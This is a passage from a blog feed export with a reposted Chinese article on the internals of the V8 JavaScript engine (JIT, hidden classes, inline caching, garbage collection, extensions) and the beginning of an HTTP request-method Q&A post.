alt="img"></p><p>JavaScript本质上是一种解释型语言，与编译型语言不同的是它需要一遍执行一边解析，而编译型语言在执行时已经完成编译，可直接执行，有更快的执行速度(如上图所示)。JavaScript代码是在浏览器端解析和执行的，如果需要时间太长，会影响用户体验。那么提高JavaScript的解析速度就是当务之急。JavaScript引擎和渲染引擎的关系如下图所示：</p><p><img src="https://pic4.zhimg.com/80/v2-43b71b75cd4f28db05ab967e3aad5a97_720w.png" alt="img"></p><p>JavaScript语言是解释型语言，为了提高性能，引入了Java虚拟机和C++编译器中的众多技术。现在JavaScript引擎的执行过程大致是：</p><p>源代码-→抽象语法树-→字节码-→JIT-→本地代码(V8引擎没有中间字节码)。一段代码的抽象语法树示例如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function demo(name) &#123;</span><br><span class="line">    console.log(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>抽象语法树如下：</p><p><img src="https://pic4.zhimg.com/80/v2-4ee7dc5c0787930c03ff203c41a1482b_720w.png" alt="img"></p><p>V8更加直接的将抽象语法树通过JIT技术转换成本地代码，放弃了在字节码阶段可以进行的一些性能优化，但保证了执行速度。在V8生成本地代码后，也会通过Profiler采集一些信息，来优化本地代码。虽然，少了生成字节码这一阶段的性能优化，但极大减少了转换时间。</p><p>但是在2017年4月底，v8 的 5.9 版本发布了，新增了一个 Ignition 字节码解释器，将默认启动，从此之后将与JSCore有大致相同的流程。做出这一改变的原因为：（主要动机）减轻机器码占用的内存空间，即牺牲时间换空间；提高代码的启动速度；对 v8 的代码进行重构，降低 v8 的代码复杂度(<a href="https://link.zhihu.com/?target=https://cnodejs.org/topic/59084a9cbbaf2f3f569be482">V8 Ignition：JS 引擎与字节码的不解之缘 - CNode技术社区</a>)。</p><p>JavaScript的性能和C相比还有不小的距离，可预见的未来估计也只能接近它，而不是与它相比，这从语言类型上已经决定。下面将对V8引擎进行更为细致的介绍。</p><h2 id="2-V8引擎"><a href="#2-V8引擎" class="headerlink" title="2.V8引擎"></a>2.V8引擎</h2><p>V8引擎是一个JavaScript引擎实现，最初由一些语言方面专家设计，后被谷歌收购，随后谷歌对其进行了开源。V8使用C++开发，，在运行JavaScript之前，相比其它的JavaScript的引擎转换成字节码或解释执行，V8将其编译成原生机器码（IA-32, x86-64, ARM, or MIPS CPUs），并且使用了如内联缓存（inline caching）等方法来提高性能。有了这些功能，JavaScript程序在V8引擎下的运行速度媲美二进制程序。V8支持众多操作系统，如windows、linux、android等，也支持其他硬件架构，如IA32,X64,ARM等，具有很好的可移植和跨平台特性。<br>V8项目代码结构如下：</p><p><img src="https://pic4.zhimg.com/80/v2-cb5e37b2c362ad0335d6331ef3be6daf_720w.png" alt="img"></p><h2 id="2-1-数据表示"><a href="#2-1-数据表示" class="headerlink" title="2.1.数据表示"></a>2.1.数据表示</h2><p>JavaScript是一种动态类型语言，在编译时并不能准确知道变量的类型，只可以在运行时确定，这就不像c++或者java等静态类型语言，在编译时候就可以确切知道变量的类型。然而，在运行时计算和决定类型，会严重影响语言性能，这也就是JavaScript运行效率比C++或者JAVA低很多的原因之一。</p><p>在C++中，源代码需要经过编译才能执行，在生成本地代码的过程中，变量的地址和类型已经确定，运行本地代码时利用数组和位移就可以存取变量和方法的地址，不需要再进行额外的查找，几个机器指令即可完成，节省了确定类型和地址的时间。由于JavaScript是无类型语言，那就不能像c++那样在执行时已经知道变量的类型和地址，需要临时确定。JavaScript 和C++有以下几个区别：</p><ul><li>编译确定位置，C++编译阶段确定位置偏移信息，在执行时直接存取，JavaScript在执行阶段确定，而且执行期间可以修改对象属性；</li><li>偏移信息共享，C++有类型定义，执行时不能动态改变，可共享偏移信息，JavaScript每个对象都是自描述，属性和位置偏移信息都包含在自身的结构中；</li><li>偏移信息查找，C++查找偏移地址很简单，在编译代码阶段，对使用的某类型成员变量直接设置偏移位置，JavaScript中使用一个对象，需要通过属性名匹配才能找到相应的值，需要更多的操作。</li></ul><p>在代码执行过程中，变量的存取是非常普遍和频繁的，通过偏移量来存取，使用少数两个汇编指令就能完成，如果通过属性名匹配则需要更多的汇编指令，也需要更多的内存空间。示例如下：</p><p><img src="https://pic3.zhimg.com/80/v2-794bcbcc25818b827d77ff712271ce56_720w.jpg" alt="img"></p><p>在JavaScript中，除boolean，number，string，null，undefined这个五个简单变量外，其他的数据都是对象，V8使用一种特殊的方式来表示它们，进而优化JavaScript的内部表示问题。</p><p>在V8中，数据的内部表示由数据的实际内容和数据的句柄构成。数据的实际内容是变长的，类型也是不同的；句柄固定大小，包含指向数据的指针。这种设计可以方便V8进行垃圾回收和移动数据内容，如果直接使用指针的话就会出问题或者需要更大的开销，使用句柄的话，只需修改句柄中的指针即可，使用者使用的还是句柄，指针改动是对使用者透明的。</p><p>除少数数据(如整型数据)由handle本身存储外，其他内容限于句柄大小和变长等原因，都存储在堆中。整数直接从value中取值，然后使用一个指针指向它，可以减少内存的占用并提高访问速度。一个句柄对象的大小是4字节(32位设备)或者8字节(64位设备)，而在JavaScriptCore中，使用的8个字节表示句柄。在堆中存放的对象都是4字节对齐的，所以它们指针的后两位是不需要的，V8用这两位表示数据的类型，00为整数，01为其他。</p><p>JavaScript对象在V8中的实现包含三个部分：隐藏类指针，这是v8为JavaScript对象创建的隐藏类；属性值表指针，指向该对象包含的属性值；元素表指针，指向该对象包含的属性。</p><h2 id="2-2-工作过程"><a href="#2-2-工作过程" class="headerlink" title="2.2.工作过程"></a>2.2.工作过程</h2><p>前面有过介绍，V8引擎在执行JavaScript的过程中，主要有两个阶段：编译和运行，与C++的执行前完全编译不同的是，JavaScript需要在用户使用时完成编译和执行。在V8中，JavaScript相关代码并非一下完成编译的，而是在某些代码需要执行时，才会进行编译，这就提高了响应时间，减少了时间开销。在V8引擎中，源代码先被解析器转变为抽象语法树(AST)，然后使用JIT编译器的全代码生成器从AST直接生成本地可执行代码。这个过程不同于JAVA先生成字节码或中间表示，减少了AST到字节码的转换时间，提高了代码的执行速度。但由于缺少了转换为字节码这一中间过程，也就减少了优化代码的机会。</p><p>V8引擎编译本地代码时使用的主要类如下所示：</p><ul><li>Script：表示JavaScript代码，即包含源代码，又包含编译之后生成的本地代码，即是编译入口，又是运行入口；</li><li>Compiler：编译器类，辅组Script类来编译生成代码，调用解释器(Parser)来生成AST和全代码生成器，将AST转变为本地代码；</li><li>AstNode：抽象语法树节点类，是其他所有节点的基类，包含非常多的子类，后面会针对不同的子类生成不同的本地代码；</li><li>AstVisitor：抽象语法树的访问者类，主要用来遍历异构的抽象语法树；</li><li>FullCodeGenerator：AstVisitor类的子类，通过遍历AST来为JavaScript生成本地可执行代码。</li></ul><p><img src="https://pic1.zhimg.com/80/v2-274bcd0e43b8b718ce58de8ae51e1b70_720w.png" alt="img"></p><p>JavaScript代码编译的过程大致为：Script类调用Compiler类的Compile函数为其生成本地代码。Compile函数先使用Parser类生成AST，再使用FullCodeGenerator类来生成本地代码。本地代码与具体的硬件平台密切相关，FullCodeGenerator使用多个后端来生成与平台相匹配的本地汇编代码。由于FullCodeGenerator通过遍历AST来为每个节点生成相应的汇编代码，缺失了全局视图，节点之间的优化也就无从谈起。</p><p>在执行编译之前，V8会构建众多全局对象并加载一些内置的库（如math库），来构建一个运行环境。而且在JavaScript源代码中，并非所有的函数都被编译生成本地代码，而是延迟编译，在调用时才会编译。</p><p>由于V8缺少了生成中间代码这一环节，缺少了必要的优化，为了提升性能，V8会在生成本地代码后，使用数据分析器(profiler)采集一些信息，然后根据这些数据将本地代码进行优化，生成更高效的本地代码，这是一个逐步改进的过程。同时，当发现优化后代码的性能还不如未优化的代码，V8将退回原来的代码，也就是优化回滚。下面介绍一下运行阶段，该阶段使用的主要类如下所示：</p><ul><li>Script：表示JavaScript代码，即包含源代码，又包含编译之后生成的本地代码，即是编译入口，又是运行入口；</li><li>Execution：运行代码的辅组类，包含一些重要函数，如Call函数，它辅组进入和执行Script代码；</li><li>JSFunction：需要执行的JavaScript函数表示类；</li><li>Runtime：运行这些本地代码的辅组类，主要提供运行时所需的辅组函数，如：属性访问、类型转换、编译、算术、位操作、比较、正则表达式等；</li><li>Heap：运行本地代码需要使用的内存堆类；</li><li>MarkCompactCollector：垃圾回收机制的主要实现类，用来标记、清除和整理等基本的垃圾回收过程；</li><li>SweeperThread：负责垃圾回收的线程。</li></ul><p><img src="https://pic4.zhimg.com/80/v2-d9eaec9f9912dd0e26c636675fe10fe3_720w.png" alt="img"></p><p>先根据需要编译和生成这些本地代码，也就是使用编译阶段那些类和操作。在V8中，函数是一个基本单位，当某个JavaScript函数被调用时，V8会查找该函数是否已经生成本地代码，如果已经生成，则直接调用该函数。否则，V8引擎会生成属于该函数的本地代码。这就节约了时间，减少了处理那些使用不到的代码的时间。其次，执行编译后的代码为JavaScript构建JS对象，这需要Runtime类来辅组创建对象，并需要从Heap类分配内存。再次，借助Runtime类中的辅组函数来完成一些功能，如属性访问等。最后，将不用的空间进行标记清除和垃圾回收。</p><h2 id="2-3-优化回滚"><a href="#2-3-优化回滚" class="headerlink" title="2.3.优化回滚"></a>2.3.优化回滚</h2><p>因为V8是基于AST直接生成本地代码，没有经过中间表示层的优化，所以本地代码尚未经过很好的优化。于是，在2010年，V8引入了新的编译器-Crankshaft，它主要针对热点函数进行优化，基于JavaScript源代码开始分析而非本地代码，同时构建Hydroger图并基于此来进行优化分析。</p><p>Crankshaft编译器为了性能考虑，通常会做出比较乐观和大胆的预测—代码稳定且变量类型不变，所以可以生成高效的本地代码。但是，鉴于JavaScript的一个弱类型的语言，变量类型也可能在执行的过程中进行改变，鉴于这种情况，V8会将该编译器做的想当然的优化进行回滚，称为优化回滚。</p><p>示例如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var counter = 0;</span><br><span class="line">function test(x, y) &#123;</span><br><span class="line">    counter++;</span><br><span class="line">    if (counter &lt; 1000000) &#123;</span><br><span class="line">        // do something</span><br><span class="line">        return &#x27;jeri&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    var unknown = new Date();</span><br><span class="line">    console.log(unknown);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数被调用多次之后，V8引擎可能会触发Crankshaft编译器对其进行优化，而优化代码认为示例代码的类型信息都已经被确定。但，由于尚未真正执行到new Date()这个地方，并未获取unknown这个变量的类型，V8只得将该部分代码进行回滚。优化回滚是一个很耗时的操作，在写代码过程中，尽量不要触发优化该操作。</p><p>在最近发布的 V8 5.9 版本中，新增了一个 Ignition 字节码解释器，TurboFan 和 Ignition 结合起来共同完成JavaScript的编译。这个版本中消除 Cranshaft 这个旧的编译器，并让新的 Turbofan 直接从字节码来优化代码，并当需要进行反优化的时候直接反优化到字节码，而不需要再考虑 JS 源代码。</p><h2 id="2-4-隐藏类与内嵌缓存"><a href="#2-4-隐藏类与内嵌缓存" class="headerlink" title="2.4.隐藏类与内嵌缓存"></a>2.4.隐藏类与内嵌缓存</h2><h2 id="2-4-1-隐藏类"><a href="#2-4-1-隐藏类" class="headerlink" title="2.4.1.隐藏类"></a>2.4.1.隐藏类</h2><p>在执行C++代码时，仅凭几个指令即可根据偏移信息获取变量信息，而JavaScript里需要通过字符串匹配来查找属性值的，这就需要更多的操作才能访问到变量信息，而代码量变量存取是十分频繁的，这也就制约了JavaScript的性能。V8借用了类和偏移位置的思想，将本来通过属性名匹配来访问属性值的方法进行了改进，使用类似C++编译器的偏移位置机制来实现，这就是隐藏类。</p><p>隐藏类将对象划分成不同的组，对于组内对象拥有相同的属性名和属性值的情况，将这些组的属性名和对应的偏移位置保存在一个隐藏类中，组内所有对象共享该信息。同时，也可以识别属性不同的对象。示例如下：</p><p><img src="https://pic2.zhimg.com/80/v2-bf67f5eb2667ddd86bfde785612aca35_720w.png" alt="img"></p><p>使用Point构造了两个对象p和q，这两个对象具有相同的属性名，V8将它们归为同一个组，也就是隐藏类，这些属性在隐藏类中有相同的偏移值，p和q共享这一信息，进行属性访问时，只需根据隐藏类的偏移值即可。由于JavaScript是动态类型语言，在执行时可以更改变量的类型，如果上述代码执行之后，执行q.z=2，那么p和q将不再被认为是一个组，q将是一个新的隐藏类。</p><h2 id="2-4-2-内嵌缓存"><a href="#2-4-2-内嵌缓存" class="headerlink" title="2.4.2.内嵌缓存"></a>2.4.2.内嵌缓存</h2><p>正常访问对象属性的过程是：首先获取隐藏类的地址，然后根据属性名查找偏移值，然后计算该属性的地址。虽然相比以往在整个执行环境中查找减小了很大的工作量，但依然比较耗时。能不能将之前查询的结果缓存起来，供再次访问呢？当然是可行的，这就是内嵌缓存。</p><p>内嵌缓存的大致思路就是将初次查找的隐藏类和偏移值保存起来，当下次查找的时候，先比较当前对象是否是之前的隐藏类，如果是的话，直接使用之前的缓存结果，减少再次查找表的时间。当然，如果一个对象有多个属性，那么缓存失误的概率就会提高，因为某个属性的类型变化之后，对象的隐藏类也会变化，就与之前的缓存不一致，需要重新使用以前的方式查找哈希表。</p><h2 id="2-5-内存管理"><a href="#2-5-内存管理" class="headerlink" title="2.5.内存管理"></a>2.5.内存管理</h2><p>Node中通过JavaScript使用内存时就会发现只能使用部分内存（64位系统下约为1.4 GB，32位系统下约为0.7 GB），其深层原因是 V8 垃圾回收机制的限制所致（如果可使用内存太大，V8在进行垃圾回收时需耗费更多的资源和时间，严重影响JS的执行效率）。下面对内存管理进行介绍。</p><p>内存的管理组要由分配和回收两个部分构成。V8的内存划分如下：</p><ul><li><p>Zone：管理小块内存。其先自己申请一块内存，然后管理和分配一些小内存，当一块小内存被分配之后，不能被Zone回收，只能一次性回收Zone分配的所有小内存。当一个过程需要很多内存，Zone将需要分配大量的内存，却又不能及时回收，会导致内存不足情况。</p></li><li><p>堆：管理JavaScript使用的数据、生成的代码、哈希表等。为方便实现垃圾回收，堆被分为三个部分：</p><p>年轻分代：为新创建的对象分配内存空间，经常需要进行垃圾回收。为方便年轻分代中的内容回收，可再将年轻分代分为两半，一半用来分配，另一半在回收时负责将之前还需要保留的对象复制过来。<br>年老分代：根据需要将年老的对象、指针、代码等数据保存起来，较少地进行垃圾回收。<br>大对象：为那些需要使用较多内存对象分配内存，当然同样可能包含数据和代码等分配的内存，一个页面只分配一个对象。</p></li></ul><p><img src="https://pic4.zhimg.com/80/v2-76f0fb426e86e9b54fecb6bef2582e8b_720w.png" alt="img"></p><h2 id="垃圾回收"><a href="#垃圾回收" class="headerlink" title="垃圾回收"></a>垃圾回收</h2><p>V8 使用了分代和大数据的内存分配，在回收内存时使用精简整理的算法标记未引用的对象，然后消除没有标记的对象，最后整理和压缩那些还未保存的对象，即可完成垃圾回收。</p><p>在V8中，使用较多的是年轻分代和年老分代。年轻分代中的对象垃圾回收主要通过Scavenge算法进行垃圾回收。在Scavenge的具体实现中，主要采用了Cheney算法：通过复制的方式实现的垃圾回收算法。它将堆内存分为两个 semispace，一个处于使用中（From空间），另一个处于闲置状态（To空间）。当分配对象时，先是在From空间中进行分配。当开始进行垃圾回收时，会检查From空间中的存活对象，这些存活对象将被复制到To空间中，而非存活对象占用的空间将会被释放。完成复制后，From空间和To空间的角色发生对换。在垃圾回收的过程中，就是通过将存活对象在两个 semispace 空间之间进行复制。年轻分代中的对象有机会晋升为年老分代，条件主要有两个：一个是对象是否经历过Scavenge回收，一个是To空间的内存占用比超过限制。</p><p>对于年老分代中的对象，由于存活对象占较大比重，再采用上面的方式会有两个问题：一个是存活对象较多，复制存活对象的效率将会很低；另一个问题依然是浪费一半空间的问题。为此，V8在年老分代中主要采用了Mark-Sweep（标记清除）标记清除和Mark-Compact（标记整理）相结合的方式进行垃圾回收。</p><h2 id="2-6-快照"><a href="#2-6-快照" class="headerlink" title="2.6.快照"></a>2.6.快照</h2><p>在V8引擎启动时，需要构建JavaScript运行环境，需要加载很多内置对象，同时也需要建立内置的函数，如Array，String，Math等。为了使V8更加整洁，加载对象和建立函数等任务都是使用JavaScript文件来实现的，V8引擎负责提供机制来支持，就是在编译和执行JavaScript前先加载这些文件。</p><p>V8引擎需要编译和执行这些内置的JavaScript代码，同时使用堆等来保存执行过程中创建的对象、代码等，这些都需要时间。为此，V8引入了快照机制。将这些内置的对象和函数加载之后的内存保存并序列化。序列化之后的结果很容易反序列化，经过快照机制的启动时间可以缩减几毫秒。快照机制也可以将一些开发者认为需要的JavaScript文件序列化，以减少处理时间。不过快照机制的加载的代码不能被CrankShaft这样的编译器优化，可能会存在性能问题。</p><h2 id="3-V8-VS-JavaScriptCore"><a href="#3-V8-VS-JavaScriptCore" class="headerlink" title="3.V8 VS JavaScriptCore"></a>3.V8 VS JavaScriptCore</h2><p>JavaScriptCore引擎是WebKit中默认的JavaScript引擎，也是苹果开源的一个项目，应用较为广泛。最初，性能不是很好，从2008年开始了一系列的优化，重新实现了编译器和字节码解释器，使得引擎的性能有较大的提升。随后内嵌缓存、基于正则表达式的JIT、简单的JIT及字节码解释器等技术引入进来，JavaScriptCore引擎也在不断的迭代和发展。</p><p>V8引擎自诞生之日起就以性能优化作为目标，引入了众多新技术，极大了带动了整个业界JavaScript引擎性能的快速发展。总的来说，V8引擎较为激进，青睐可以提高性能的新技术，而JavaScriptCore引擎较为稳健，渐进式的改变着自己的性能。总的来说JavaScript引擎工作流程（包含v8和JavaScriptCore）如下所示：</p><p><img src="https://pic1.zhimg.com/80/v2-993bbf0a46f6feaef5f7b5005aa1aa34_720w.png" alt="img"></p><p>JavaScriptCore 的大致流程为：源代码-→抽象语法树-→字节码-→JIT-→本地代码。JavaScriptCore与V8有一些不同之处，其中最大的不同就是新增了<strong>字节码</strong>的中间表示，并加入了多层JIT编译器（如：简单JIT编译器、DFG JIT编译器、LLVM等）优化性能，不停的对本地代码进行优化。(<strong>在 V8 的 5.9 版本中，新增了一个 Ignition 字节码解释器，TurboFan 和 Ignition 结合起来共同完成JavaScript的编译，此后 V8 将与 JavaScriptCore 有大致相同的流程，Node 8.0中 V8 版本为 5.8</strong>)</p><p>还有就是在数据表示方面，V8在不同的机器上使用与机器位数相匹配的数据表示，而在JavaScriptCore中句柄都是使用64位表示，其可以表示更大范围的数字，所以即使在32位机器上，浮点类型同样可以保存在句柄中，不再需要访问堆中的数据，当也会占用更多的空间。</p><h2 id="4-功能扩展"><a href="#4-功能扩展" class="headerlink" title="4.功能扩展"></a>4.功能扩展</h2><p>JavaScript引擎的主要功能是解析和执行JavaScript代码，往往不能满足使用者多样化的需要，那么就可以增加扩展以提升它的能力。V8引擎有两种扩展机制：绑定和扩展。</p><h2 id="4-1-绑定机制"><a href="#4-1-绑定机制" class="headerlink" title="4.1.绑定机制"></a>4.1.绑定机制</h2><p>使用IDL文件或接口文件生成绑定文件，将这些文件同V8引擎一起编译。WebKit中使用IDL来定义JavaScript，但又与IDL有所不同，有一些改变。定义一个新的接口的步骤大致如下：</p><ul><li>1.定义新的接口文件，可以在JavaScript代码进行调用，如mymodule.MyObj.myAttr；</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">module mymodule &#123;</span><br><span class="line">    interface [</span><br><span class="line">            InterfaceName = MyObject</span><br><span class="line">    ] MyObj &#123; </span><br><span class="line">        readonly attribute long myAttr;</span><br><span class="line">        DOMString myMethod (DOMString myArg);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>2.按照引擎定义的标准接口为基础实现接口类，生成JavaScript引擎所需的绑定文件。WebKit提供了工具帮助生成所需的绑定类，根据引擎不同和引擎开发语言的不同而有所差异。V8引擎会为上述示例代码生成 v8MyObj.h (MyObj类具体的实现代码)和 V8MyObj.cpp (桥接代码，辅组注册桥接的函数到V8引擎)两个绑定文件。</li></ul><p>JavaScript引擎绑定机制需要将扩展代码和JavaScript引擎一块编译和打包，不能根据需要在引擎启动后再动态注入这些本地代码。在实际WEB开发中，开发者都是基于现有浏览器的，根本不可能介入到JavaScript引擎的编译中，绑定机制有很大的局限性，但其非常高效，适用于对性能要求较高的场景。</p><h2 id="4-2-Extension机制"><a href="#4-2-Extension机制" class="headerlink" title="4.2. Extension机制"></a>4.2. Extension机制</h2><p>通过V8的基类Extension进行能力扩展，无需和V8引擎一起编译，可以动态为引擎增加功能特性，具有很大的灵活性。</p><p>Extension机制的大致思路就是，V8提供一个基类Extension和一个全局注册函数，要想扩展JavaScript能力，需要经过以下步骤：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class MYExtension : public v8::Extension &#123;</span><br><span class="line">    public:</span><br><span class="line">        MYExtension() : v8::Extension(&quot;v8/My&quot;, &quot;native function my();&quot;) &#123;&#125;</span><br><span class="line">        virtual v8::Handle&lt;v8::FunctionTemplate&gt; GetNativeFunction (</span><br><span class="line">        v8::Handle&lt;v8::String&gt; name) &#123;</span><br><span class="line">            // 可以根据name来返回不同的函数</span><br><span class="line">            return v8::FunctionTemplate::New(MYExtention::MY);</span><br><span class="line">        &#125;</span><br><span class="line">        static v8::Handle&lt;v8::Value&gt; MY(const v8::Arguments&amp; args) &#123;</span><br><span class="line">            // Do sth here</span><br><span class="line">            return v8::Undefined();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line">MYExtension extension;</span><br><span class="line">RegisterExtension(&amp;extension);</span><br></pre></td></tr></table></figure><ul><li>1.基于Extension基类构建一个它的子类，并实现它的虚函数—GetNativeFunction，根据参数name来决定返回实函数；</li><li>2.创建一个该子类的对象，并通过注册函数将该对象注册到V8引擎，当JavaScript调用’my’函数时就可被调用到。</li></ul><p>Extension机制是调用V8的接口注入新函数，动态扩展非常方便，但没有绑定机制高效，适用于对性能要求不高的场景。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在过去几年，JavaScript在很多领域得到了广泛的应用，然而限于JavaScript语言本身的不足，执行效率不高。Google也推出了一些JavaScript网络应用，如Gmail、Google Maps及Google Docs office等。这些应用的性能不仅受到服务器、网络、渲染引擎以及其他诸多因素的影响，同时也受到JavaScript本身执行速度的影响。然而既有的JavaScript引擎无法满足新的需求，而性能不佳一直是网络应用开发者最关心的。Google就开始了V8引擎的研究，将一系列新技术引入JavaScript引擎中，大大提高了JavaScript的执行效率。相信随着V8引擎的不断发展，JavaScript也会有更广泛的应用场景，前端工程师也会有更好的未来！<br>那么结合上面对于V8引擎的介绍，我们在编程中应注意：</p><ul><li>类型。对于函数，JavaScript是一种动态类型语言，JavaScriptCore和V8都使用隐藏类和内嵌缓存来提高性能，为了保证缓存命中率，一个函数应该使用较少的数据类型；对于数组，应尽量存放相同类型的数据，这样就可以通过偏移位置来访问。</li><li>数据表示。简单类型数据（如整型）直接保存在句柄中，可以减少寻址时间和内存占用，如果可以使用整数表示的，尽量不要用浮点类型。</li><li>内存。虽然JavaScript语言会自己进行垃圾回收，但我们也应尽量做到及时回收不用的内存，对不再使用的对象设置为null或使用delete方法来删除(使用delete方法删除会触发隐藏类新建，需要更多的额外操作)。</li><li>优化回滚。在执行多次之后，不要出现修改对象类型的语句，尽量不要触发优化回滚，否则会大幅度降低代码的性能。</li><li>新机制。使用JavaScript引擎或者渲染引擎提供的新机制和新接口提高性能。</li></ul><p>转载至<a href="https://zhuanlan.zhihu.com/p/27628685">https://zhuanlan.zhihu.com/p/27628685</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="V8引擎" scheme="http://aiolimp.com/categories/V8%E5%BC%95%E6%93%8E/"/>
    
    
    <category term="V8引擎" scheme="http://aiolimp.com/tags/V8%E5%BC%95%E6%93%8E/"/>
    
  </entry>
  
  <entry>
    <title>HTTP&amp;&amp;HTTPS</title>
    <link href="http://aiolimp.com/2021/08/10/HTTP&amp;&amp;HTTPS/"/>
    <id>http://aiolimp.com/2021/08/10/HTTP&amp;&amp;HTTPS/</id>
    <published>2021-08-10T08:57:49.000Z</published>
    <updated>2023-03-05T13:32:12.205Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="001-HTTP-报文结构是怎样的？"><a href="#001-HTTP-报文结构是怎样的？" class="headerlink" title="001. HTTP 报文结构是怎样的？"></a>001. HTTP 报文结构是怎样的？</h2><p>对于 TCP 而言，在传输的时候分为两个部分:<strong>TCP头</strong>和<strong>数据部分</strong>。</p><p>而 HTTP 类似，也是<code>header + body</code>的结构，具体而言:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">起始行 + 头部 + 空行 + 实体</span><br></pre></td></tr></table></figure><p>由于 http <code>请求报文</code>和<code>响应报文</code>是有一定区别，因此我们分开介绍。</p><h3 id="起始行"><a href="#起始行" class="headerlink" title="起始行"></a>起始行</h3><p>对于请求报文来说，起始行类似下面这样:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;home HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure><p>也就是<strong>方法 + 路径 + http版本</strong>。</p><p>对于响应报文来说，起始行一般张这个样:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br></pre></td></tr></table></figure><p>响应报文的起始行也叫做<code>状态行</code>。由<strong>http版本、状态码和原因</strong>三部分组成。</p><p>值得注意的是，在起始行中，每两个部分之间用<strong>空格</strong>隔开，最后一个部分后面应该接一个<strong>换行</strong>，严格遵循<code>ABNF</code>语法规范。</p><h3 id="头部"><a href="#头部" class="headerlink" title="头部"></a>头部</h3><p>展示一下请求头和响应头在报文中的位置:</p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/22/170ffd6012e2fc88~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/22/170ffd62af8538e4~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><p>不管是请求头还是响应头，其中的字段是相当多的，而且牵扯到<code>http</code>非常多的特性，这里就不一一列举的，重点看看这些头部字段的格式：</p><ul><li><ol><li>字段名不区分大小写</li></ol></li><li><ol><li>字段名不允许出现空格，不可以出现下划线<code>_</code></li></ol></li><li><ol><li>字段名后面必须<strong>紧接着<code>:</code></strong></li></ol></li></ul><h3 id="空行"><a href="#空行" class="headerlink" title="空行"></a>空行</h3><p>很重要，用来区分开<code>头部</code>和<code>实体</code>。</p><p>问: 如果说在头部中间故意加一个空行会怎么样？</p><p>那么空行后的内容全部被视为实体。</p><h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3><p>就是具体的数据了，也就是<code>body</code>部分。请求报文对应<code>请求体</code>, 响应报文对应<code>响应体</code>。</p><h2 id="002-如何理解-HTTP-的请求方法？"><a href="#002-如何理解-HTTP-的请求方法？" class="headerlink" title="002. 如何理解 HTTP 的请求方法？"></a>002. 如何理解 HTTP 的请求方法？</h2><h3 id="有哪些请求方法？"><a href="#有哪些请求方法？" class="headerlink" title="有哪些请求方法？"></a>有哪些请求方法？</h3><p><code>http/1.1</code>规定了以下请求方法(注意，都是大写):</p><ul><li>GET: 通常用来获取资源</li><li>HEAD: 获取资源的元信息</li><li>POST: 提交数据，即上传数据</li><li>PUT: 修改数据</li><li>DELETE: 删除资源(几乎用不到)</li><li>CONNECT: 建立连接隧道，用于代理服务器</li><li>OPTIONS: 列出可对资源实行的请求方法，用来跨域请求</li><li>TRACE: 追踪请求-响应的传输路径</li></ul><h3 id="GET-和-POST-有什么区别？"><a href="#GET-和-POST-有什么区别？" class="headerlink" title="GET 和 POST 有什么区别？"></a>GET 和 POST 有什么区别？</h3><p>首先最直观的是语义上的区别。</p><p>而后又有这样一些具体的差别:</p><ul><li>从<strong>缓存</strong>的角度，GET 请求会被浏览器主动缓存下来，留下历史记录，而 POST 默认不会。</li><li>从<strong>编码</strong>的角度，GET 只能进行 URL 编码，只能接收 ASCII 字符，而 POST 没有限制。</li><li>从<strong>参数</strong>的角度，GET 一般放在 URL 中，因此不安全，POST 放在请求体中，更适合传输敏感信息。</li><li>从<strong>幂等性</strong>的角度，<code>GET</code>是<strong>幂等</strong>的，而<code>POST</code>不是。(<code>幂等</code>表示执行相同的操作，结果也是相同的)</li><li>从<strong>TCP</strong>的角度，GET 请求会把请求报文一次性发出去，而 POST 会分为两个 TCP 数据包，首先发 header 部分，如果服务器响应 100(continue)， 然后发 body 部分。(<strong>火狐</strong>浏览器除外，它的 POST 请求只发一个 TCP 包)</li></ul><h2 id="003-如何理解-URI？"><a 